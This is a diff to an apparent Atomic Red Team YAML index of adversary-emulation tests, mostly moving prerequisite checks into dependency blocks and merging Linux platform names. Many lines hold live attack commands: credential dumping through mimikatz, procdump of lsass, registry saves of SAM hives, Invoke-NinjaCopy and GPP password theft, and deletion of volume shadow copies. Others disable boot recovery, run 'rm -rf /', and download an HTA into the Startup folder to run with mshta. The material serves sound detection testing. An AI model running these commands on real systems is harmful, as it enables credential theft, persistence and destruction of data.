@@ -187,7 +187,7 @@ persistence:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -218,7 +218,7 @@ persistence:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -249,7 +249,7 @@ persistence:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -281,7 +281,7 @@ persistence:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -313,7 +313,7 @@ persistence:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -345,7 +345,7 @@ persistence:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -377,7 +377,7 @@ persistence:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force | Out-Null
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -2404,8 +2404,6 @@ persistence:
 
 '
       supported_platforms:
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         kernel_module_file:
@@ -2793,8 +2791,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -2818,8 +2814,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -2840,8 +2834,6 @@ persistence:
         Event Monitor Daemon. \n"
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: manual
@@ -4405,12 +4397,13 @@ persistence:
           description: Class factory of transport agent.
           type: string
           default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
+      dependencies:
+      - description: Microsoft Exchange SnapIn must be installed
+        prereq_command: Get-TransportAgent -TransportService FrontEnd
+        get_prereq_command: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
       executor:
         name: powershell
         elevation_required: true
-        prereq_command: |
-          Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
-          Get-TransportAgent -TransportService FrontEnd
         command: |
           Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}
           Enable-TransportAgent #{transport_agent_identity}
@@ -4560,8 +4553,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         payload:
@@ -4584,8 +4575,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -4603,8 +4592,6 @@ persistence:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -7248,6 +7235,11 @@ defense-evasion:
             the default)
           type: string
           default: SysmonDrv
+      dependencies:
+      - description: Sysmon filter must be loaded
+        prereq_command: 'fltmc.exe filters | findstr #{sysmon_driver}'
+        get_prereq_command: echo Automated installer not implemented yet, please install
+          Sysmon manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -7292,12 +7284,28 @@ defense-evasion:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        sysmon_exe:
+          description: The location of the Sysmon executable from Sysinternals (ignored
+            if sysmon.exe is found in your PATH)
+          type: Path
+          default: PathToAtomicsFolder\T1089\bin\sysmon.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Sysmon executable must be available
+        prereq_command: if(cmd /c where sysmon) {0} else {1}
+        get_prereq_command: |-
+          $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
+          New-Item -ItemType Directory $parentpath -Force | Out-Null
+          Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
+          Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
+          if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
+      - description: Sysmon must be installed
+        prereq_command: if(cmd /c sc query sysmon) {0} else {1}
+        get_prereq_command: cmd /c sysmon -i -accepteula
       executor:
         name: command_prompt
         elevation_required: true
-        prereq_command: 'sc query sysmon > nul
-
-'
         command: 'sysmon -u
 
 '
@@ -7655,8 +7663,6 @@ defense-evasion:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         command: 'rm -rf / --no-preserve-root > /dev/null 2> /dev/null
@@ -10067,11 +10073,17 @@ defense-evasion:
           description: URL to HTA file for execution
           type: string
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+        temp_file:
+          description: temp_file location for hta
+          type: string
+          default: "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta"
       executor:
-        name: command_prompt
-        command: 'mshta #{hta_url}
-
-'
+        name: powershell
+        command: |
+          $var =Invoke-WebRequest "#{hta_url}"
+          $var.content|out-file "#{temp_file}"
+          mshta "#{temp_file}"
+        cleanup_command: "remove-item \"#{temp_file}\" \n"
   T1096:
     technique:
       x_mitre_data_sources:
@@ -12021,7 +12033,6 @@ defense-evasion:
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: ''
         command: |
           set comspec=#{command_to_execute}
           cscript manage-bde.wsf
@@ -12959,7 +12970,7 @@ privilege-escalation:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -12990,7 +13001,7 @@ privilege-escalation:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -13021,7 +13032,7 @@ privilege-escalation:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -13053,7 +13064,7 @@ privilege-escalation:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -13085,7 +13096,7 @@ privilege-escalation:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -13117,7 +13128,7 @@ privilege-escalation:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -13149,7 +13160,7 @@ privilege-escalation:
           IF(!(Test-Path $registryPath))
            {
             New-Item -Path $registryPath -Force | Out-Null
-            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType DWORD -Force
+            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
            }
           ELSE
            {
@@ -15308,8 +15319,6 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         payload:
@@ -15332,8 +15341,6 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -15351,8 +15358,6 @@ privilege-escalation:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         file_to_setuid:
@@ -15763,18 +15768,26 @@ impact:
         user_account:
           description: User account whose password will be changed.
           type: string
-          default: Administrator
+          default: AtomicAdministrator
         new_password:
           description: New password for the specified account.
           type: string
           default: HuHuHUHoHo283283@dJD
+        new_user_password:
+          description: Password to use if user account must be created first
+          type: string
+          default: User2ChangePW!
+      dependencies:
+      - description: 'User account to change password of must exist (User: #{user_account})'
+        prereq_command: 'net user #{user_account}'
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
       executor:
         name: command_prompt
         elevation_required: true
-        prereq_command: 'net.exe user #{user_account}
+        command: 'net.exe user #{user_account} #{new_password}
 
 '
-        command: 'net.exe user #{user_account} #{new_password}
+        cleanup_command: 'net.exe user #{user_account} /delete
 
 '
     - name: Delete User - Windows
@@ -15788,12 +15801,17 @@ impact:
           description: User account to be deleted.
           type: string
           default: AtomicUser
+        new_user_password:
+          description: Password to use if user account must be created first
+          type: string
+          default: User2DeletePW!
+      dependencies:
+      - description: 'User account to delete must exist (User: #{user_account})'
+        prereq_command: 'net user #{user_account}'
+        get_prereq_command: 'net user #{user_account} #{new_user_password} /add'
       executor:
         name: command_prompt
         elevation_required: true
-        prereq_command: |
-          net.exe user #{user_account} /add
-          net.exe user #{user_account} P@$$w0rd
         command: 'net.exe user #{user_account} /delete'
   T1485:
     technique:
@@ -15914,25 +15932,32 @@ impact:
       supported_platforms:
       - windows
       input_arguments:
-        sdelete_path:
-          description: Path to sdelete.exe
+        sdelete_exe:
+          description: Path of sdelete executable
           type: Path
-          default: ''
+          default: PathToAtomicsFolder\T1485\bin\sdelete.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Secure delete tool from Sysinternals must exist on disk at specified
+          location (#{sdelete_exe})
+        prereq_command: 'if (Test-Path #{sdelete_exe}) {0} else {1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
+          Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
+          New-Item -ItemType Directory (Split-Path "#{sdelete_exe}") -Force | Out-Null
+          Copy-Item $env:TEMP\Sdelete\sdelete.exe "#{sdelete_exe}" -Force
       executor:
         name: powershell
         command: |
           New-Item $env:TEMP\T1485.txt
-          Set-Location #{sdelete_path}
-          .\sdelete.exe -accepteula $env:TEMP\T1485.txt
+          #{sdelete_exe} -accepteula $env:TEMP\T1485.txt
     - name: macOS/Linux - Overwrite file with DD
       description: |
         Overwrites and deletes a file using DD.
         To stop the test, break the command with CTRL/CMD+C.
       supported_platforms:
-      - centos
       - linux
       - macos
-      - ubuntu
       input_arguments:
         overwrite_source:
           description: Path of data source to overwrite with
@@ -16130,6 +16155,19 @@ impact:
         command: |
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
+    - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
+      description: "Deletes Windows Volume Shadow Copies with PowerShell code and
+        Get-WMIObject. \nThis technique is used by numerous ransomware families such
+        as Sodinokibi/REvil.\nExecutes Get-WMIObject \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: 'powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object
+          {$_.Delete();}"
+
+'
   T1496:
     technique:
       x_mitre_data_sources:
@@ -16200,8 +16238,6 @@ impact:
         End the test by using CTRL/CMD+C to break.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: bash
@@ -16428,8 +16464,6 @@ impact:
       supported_platforms:
       - macos
       - linux
-      - centos
-      - ubuntu
       input_arguments:
         timeout:
           description: Time to restart (can be minutes or specific time)
@@ -16448,8 +16482,6 @@ impact:
       supported_platforms:
       - macos
       - linux
-      - centos
-      - ubuntu
       input_arguments:
         timeout:
           description: Time to shutdown (can be minutes or specific time)
@@ -16468,8 +16500,6 @@ impact:
       supported_platforms:
       - macos
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -16482,8 +16512,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -16494,8 +16522,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -16506,8 +16532,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -16518,8 +16542,6 @@ impact:
 '
       supported_platforms:
       - linux
-      - centos
-      - ubuntu
       executor:
         name: bash
         elevation_required: true
@@ -17722,7 +17744,7 @@ discovery:
 
 '
       supported_platforms:
-      - ubuntu
+      - linux
       executor:
         name: bash
         command: 'cat /etc/pam.d/common-password
@@ -17734,7 +17756,12 @@ discovery:
 
 '
       supported_platforms:
-      - centos
+      - linux
+      dependencies:
+      - description: System must be CentOS or RHEL v7
+        prereq_command: if [ $(rpm -q --queryformat '%{VERSION}') -eq "7" ]; then
+          exit /b 0; else exit /b 1; fi;
+        get_prereq_command: echo Please run from CentOS or RHEL v7
       executor:
         name: bash
         command: 'cat /etc/security/pwquality.conf
@@ -17746,12 +17773,16 @@ discovery:
 
 '
       supported_platforms:
-      - centos
+      - linux
+      dependencies:
+      - description: System must be CentOS or RHEL v6
+        prereq_command: if [ $(rpm -q --queryformat '%{VERSION}') -eq "6" ]; then
+          exit /b 0; else exit /b 1; fi;
+        get_prereq_command: echo Please run from CentOS or RHEL v6
       executor:
         name: bash
         command: |
           cat /etc/pam.d/system-auth
-
           cat /etc/security/pwquality.conf
     - name: Examine password expiration policy - All Linux
       description: 'Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.
@@ -17983,8 +18014,6 @@ discovery:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         output_file:
@@ -19754,8 +19783,8 @@ credential-access:
       identifier: T1003
     atomic_tests:
     - name: Powershell Mimikatz
-      description: 'Dumps Credentials via Powershell by invoking a remote mimikatz
-        script
+      description: 'Dumps credentials from memory via Powershell by invoking a remote
+        mimikatz script
 
 '
       supported_platforms:
@@ -19773,19 +19802,29 @@ credential-access:
 
 '
     - name: Gsecdump
-      description: 'https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
+      description: 'Dump credentials from memory using Gsecdump
 
 '
       supported_platforms:
       - windows
+      input_arguments:
+        gsecdump_exe:
+          description: Path to the Gsecdump executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Windows Credential Editor must exist on disk at specified location
+          (#{gsecdump_exe})
+        prereq_command: 'if (Test-Path #{gsecdump_exe}) {0} else {1}'
+        get_prereq_command: Write-Host Automated installer not implemented yet
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'gsecdump -a
-
-'
+        command: "#{gsecdump_exe} -a\n"
     - name: Windows Credential Editor
-      description: 'http://www.ampliasecurity.com/research/windows-credentials-editor/
+      description: 'Dump credentials from memory using Windows Credential Editor from
+        https://www.ampliasecurity.com/research/windows-credentials-editor/
 
 '
       supported_platforms:
@@ -19794,35 +19833,52 @@ credential-access:
         output_file:
           description: Path where resulting data should be placed
           type: Path
-          default: output.txt
+          default: "%temp%\\output.txt"
+        wce_exe:
+          description: Path of Windows Credential Editor executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\wce.exe
+        wce_url:
+          description: Path to download Windows Credential Editor zip file
+          type: url
+          default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
+        wce_zip_hash:
+          description: File hash of the Windows Credential Editor zip file
+          type: String
+          default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Windows Credential Editor must exist on disk at specified location
+          (#{wce_exe})
+        prereq_command: 'if (Test-Path #{wce_exe}) {0} else {1}'
+        get_prereq_command: |-
+          $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+          if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
+            Expand-Archive $zippath $parentpath\wce -Force
+            Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
+            Remove-Item $zippath, $parentpath\wce -Recurse
+          }
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'wce -o #{output_file}
-
-'
+        command: "#{wce_exe} -o #{output_file}\n"
     - name: Registry dump of SAM, creds, and secrets
       description: |
         Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
         via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
       supported_platforms:
       - windows
-      input_arguments:
-        output_folder:
-          description: Output folder path
-          type: Path
-          default: C:\Windows\Temp
       executor:
         name: command_prompt
         elevation_required: true
         command: |
-          reg save HKLM\sam "#{output_folder}\sam"
-          reg save HKLM\system "#{output_folder}\system"
-          reg save HKLM\security "#{output_folder}\security"
+          reg save HKLM\sam %temp%\sam
+          reg save HKLM\system %temp%\system
+          reg save HKLM\security %temp%\security
         cleanup_command: |
-          del "#{output_folder}\sam"       >nul 2> nul
-          del "#{output_folder}\system"    >nul 2> nul
-          del "#{output_folder}\security"  >nul 2> nul
+          del %temp%\sam >nul 2> nul
+          del %temp%\system >nul 2> nul
+          del %temp%\security >nul 2> nul
     - name: Dump LSASS.exe Memory using ProcDump
       description: |
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
@@ -19830,18 +19886,28 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
-        procdump_binary_path:
-          description: Path of the ProcDump binary
-          type: string
-          default: "$PathToAtomicsFolder\\T1003\\bin\\procdump64.exe"
         output_file:
           description: Path where resulting dump should be placed
           type: Path
           default: C:\Windows\Temp\lsass_dump.dmp
+        procdump_exe:
+          description: Path of Procdump executable
+          type: Path
+          default: PathToAtomicsFolder\T1003\bin\procdump.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: ProcDump tool from Sysinternals must exist on disk at specified
+          location (#{procdump_exe})
+        prereq_command: 'if (Test-Path #{procdump_exe}) {0} else {1}'
+        get_prereq_command: |-
+          Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+          Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+          New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
       executor:
         elevation_required: true
         name: command_prompt
-        command: "#{procdump_binary_path} -accepteula -ma lsass.exe #{output_file}\n"
+        command: "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n"
         cleanup_command: 'del "#{output_file}" >nul 2> nul
 
 '
@@ -19898,6 +19964,12 @@ credential-access:
           description: Path where resulting dump should be placed
           type: Path
           default: C:\Windows\Temp
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -19916,6 +19988,12 @@ credential-access:
           description: Drive letter to source VSC (including colon)
           type: String
           default: 'C:'
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
       executor:
         name: command_prompt
         elevation_required: true
@@ -19939,6 +20017,19 @@ credential-access:
           description: Path for extracted NTDS.dit
           type: Path
           default: C:\Windows\Temp
+      dependencies:
+      - description: Target must be a Domain Controller
+        prereq_command: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v
+          ProductType | findstr LanmanNT
+        get_prereq_command: echo Sorry, Promoting this machine to a Domain Controller
+          must be done manually
+      - description: Volume shadow copy must exist
+        prereq_command: 'if not exist #{vsc_name} (exit /b 1)'
+        get_prereq_command: echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume
+          Shadow Copy with NTDS.dit'" to fulfuill this requirement
+      - description: Extract path must exist
+        prereq_command: 'if not exist #{extract_path} (exit /b 1)'
+        get_prereq_command: 'mkdir #{extract_path}'
       executor:
         name: command_prompt
         elevation_required: true
@@ -19958,6 +20049,13 @@ credential-access:
 '
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Computer must be domain joined
+        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {0} else {1}
+        get_prereq_command: Write-Host Joining this computer to a domain must be done
+          manually
       executor:
         name: command_prompt
         elevation_required: false
@@ -19975,7 +20073,23 @@ credential-access:
         gpp_script_path:
           description: Path to the Get-GPPPassword PowerShell Script
           type: Path
-          default: "$PathToAtomicsFolder\\T1003\\src\\Get-GPPPassword.ps1"
+          default: PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
+        gpp_script_url:
+          description: URL of the Get-GPPPassword PowerShell Script
+          type: url
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}'
+        prereq_command: if(Test-Path "#{gpp_script_path}") { 0 } else { 1 }
+        get_prereq_command: |-
+          New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
+          Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
+      - description: Computer must be domain joined
+        prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {0} else {1}
+        get_prereq_command: Write-Host Joining this computer to a domain must be done
+          manually
       executor:
         name: powershell
         elevation_required: false
@@ -19989,34 +20103,37 @@ credential-access:
       supported_platforms:
       - windows
       input_arguments:
-        sam_binary_path:
-          description: Path of the SAM file
-          type: string
-          default: C:\Windows\System32\config\sam
-        system_binary_path:
-          description: Path of the SYSTEM file
-          type: string
-          default: C:\Windows\System32\config\system
-        security_binary_path:
-          description: Path of the SECURITY file
-          type: string
-          default: C:\Windows\System32\config\security
+        ninjacopy_script_path:
+          description: Path to the Invoke-NinjaCopy PowerShell script
+          type: Path
+          default: PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
+        ninjacopy_script_url:
+          description: URL of the Invoke-NinjaCopy PowerShell Script
+          type: url
+          default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/6b0ada999a9d2be8c6c9267da57b898494d13219/Exfiltration/Invoke-NinjaCopy.ps1
         output_folder:
           description: Output folder path
           type: Path
           default: C:\Windows\Temp
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Invoke-NinjaCopy PowerShell Script must exist at #{ninjacopy_script_path}'
+        prereq_command: if(Test-Path "#{ninjacopy_script_path}") { 0 } else { 1 }
+        get_prereq_command: |-
+          New-Item -ItemType Directory (Split-Path "#{ninjacopy_script_path}") -Force | Out-Null
+          Invoke-WebRequest #{ninjacopy_script_url} -OutFile "#{ninjacopy_script_path}"
       executor:
         name: powershell
         elevation_required: true
         command: |
-          . $PathToAtomicsFolder\T1003\src\Invoke-NinjaCopy.ps1
-          Invoke-NinjaCopy -Path "#{sam_binary_path}" -LocalDestination "#{output_folder}\sam"
-          Invoke-NinjaCopy -Path "#{system_binary_path}" -LocalDestination "#{output_folder}\system"
-          Invoke-NinjaCopy -Path "#{security_binary_path}" -LocalDestination "#{output_folder}\security"
+          . #{ninjacopy_script_path}
+          Invoke-NinjaCopy -Path "%systemroot%\System32\sam" -LocalDestination "#{output_folder}\sam"
+          Invoke-NinjaCopy -Path "%systemroot%\System32\system" -LocalDestination "#{output_folder}\system"
+          Invoke-NinjaCopy -Path "%systemroot%\System32\security" -LocalDestination "#{output_folder}\security"
         cleanup_command: |
-          rm "#{output_folder}\sam"
-          rm "#{output_folder}\system"
-          rm "#{output_folder}\security"
+          del "#{output_folder}\sam" >nul 2> nul
+          del "#{output_folder}\system" >nul 2> nul
+          del "#{output_folder}\security" >nul 2> nul
     - name: LSASS read with pypykatz
       description: |
         Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::
@@ -20044,7 +20161,9 @@ credential-access:
         prereq_command: 'py -3
 
 '
-        command: pypykatz live registry
+        command: 'pypykatz live registry
+
+'
   T1081:
     technique:
       x_mitre_permissions_required:
@@ -21250,8 +21369,6 @@ execution:
         This will download the specified payload and set a marker file in `/tmp/art-fish.txt`.
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: sh
@@ -21877,8 +21994,6 @@ execution:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -21902,8 +22017,6 @@ execution:
 '
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       input_arguments:
         command:
@@ -21924,8 +22037,6 @@ execution:
         Event Monitor Daemon. \n"
       supported_platforms:
       - macos
-      - centos
-      - ubuntu
       - linux
       executor:
         name: manual
@@ -22110,11 +22221,17 @@ execution:
           description: URL to HTA file for execution
           type: string
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/src/T1170.hta
+        temp_file:
+          description: temp_file location for hta
+          type: string
+          default: "$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1170.hta"
       executor:
-        name: command_prompt
-        command: 'mshta #{hta_url}
-
-'
+        name: powershell
+        command: |
+          $var =Invoke-WebRequest "#{hta_url}"
+          $var.content|out-file "#{temp_file}"
+          mshta "#{temp_file}"
+        cleanup_command: "remove-item \"#{temp_file}\" \n"
   T1086:
     technique:
       x_mitre_permissions_required:
@@ -22429,12 +22546,15 @@ execution:
 '
       supported_platforms:
       - windows
+      dependencies:
+      - description: PowerShell version 2 must be installed
+        prereq_command: if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {0} else
+          {1}
+        get_prereq_command: Write-Host  Automated installer not implemented yet, please
+          install PowerShell v2 manually
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if(2 -in $PSVersionTable.PSCompatibleVersions.Major){0}else{1}
-
-'
         command: 'powershell.exe -version 2 -Command Write-Host $PSVersion
 
 '
@@ -22450,13 +22570,14 @@ execution:
           description: File created to store Alternate Stream Data
           type: String
           default: "$env:TEMP\\NTFS_ADS.txt"
+      dependencies:
+      - description: Homedrive must be an NTFS drive
+        prereq_command: if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
+          -contains "NTFS") {0} else {1}
+        get_prereq_command: Write-Host Prereq's for this test cannot be met automatically
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem
-          -contains "NTFS"){0}else{1}
-
-'
         command: |
           Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
           $streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'
@@ -23228,7 +23349,7 @@ execution:
       supported_platforms:
       - windows
       input_arguments:
-        psexec_path:
+        psexec_exe:
           description: Path to PsExec
           type: string
           default: C:\PSTools\PsExec.exe
@@ -23236,13 +23357,19 @@ execution:
           description: Remote hostname or IP address
           type: string
           default: localhost
+      dependencies:
+      - description: PsExec tool from Sysinternals must exist on disk at specified
+          location (#{psexec_exe})
+        prereq_command: if (Test-Path "#{psexec_exe}"") {0} else {1}
+        get_prereq_command: |-
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
         name: powershell
         elevation_required: false
-        prereq_command: 'if(Test-Path #{psexec_path}) {0} else {1}
-
-'
-        command: '#{psexec_path} \\#{remote_host} "C:\Windows\System32\calc.exe"
+        command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
 
 '
   T1218:
@@ -23598,7 +23725,6 @@ execution:
       executor:
         name: command_prompt
         elevation_required: false
-        prereq_command: ''
